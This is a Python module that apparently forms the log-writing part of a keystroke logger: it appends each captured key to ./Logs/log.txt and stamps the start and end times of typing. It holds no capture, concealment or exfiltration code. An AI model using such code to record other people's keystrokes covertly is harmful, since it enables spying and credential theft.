import os

class write_Read : 
    
    def __init__(self):
        pass

    #Checks whether the file is empty or not
    def file_is_Empty(self):
        if os.path.getsize("./Logs/log.txt") == 0:
            return True
        else:
            return False
    
    '''
    Reads the file to check if the last character
    ended with a space or not
    '''
    def read_file(self):
        noSpace = False
                    
        with open("./Logs/log.txt", "r") as r:
            
            last_Character = r.read()[-1]
            if last_Character == ' ':
                noSpace = True
            else:
                pass

        return noSpace

    # writes to the file log.txt for each captured key
    def write_file(self,k, Key):

        with open("./Logs/log.txt", "a") as f:

            # removes the word space
            if k == str(Key.space):
                isTrue = self.read_file()
                if isTrue == True:
                    pass
                else:
                    f.write(' ')
            elif k == "\n":
                f.write(f"{k}\t")
                print()
            else:
                if k.find("Key") == -1:
                    f.write(k)
                else:
                    pass

    # writes the time captured at the beginning
    def time_Start(self,beginning):
        isEmpty = self.file_is_Empty()
        if isEmpty:
            with open("./Logs/log.txt", "w") as time:
                time.write(f"Began typing at {format(beginning)}\n")
                time.write(f"``````````````````````````````````````````````````````````````````\n")
        else:
            with open("./Logs/log.txt", "a") as time:
                time.write(f"Began typing at {format(beginning)}\n")
                time.write(f"``````````````````````````````````````````````````````````````````\n")
        

    # writes the time captured at the end
    def time_end(self,end):
        with open("./Logs/log.txt", "a") as time:
            time.write(f"\n``````````````````````````````````````````````````````````````````")
            time.write(f"\nStopped typing at {format(end)}\n")
            time.write("************************************************************\n\n")

    # returns a string
    def format(self,time):
        structure = (f"{time.day} {time.month} {time.year}"
                f"{time.hour}:{time.minute}:"
                f"{time.second}")
        return structure

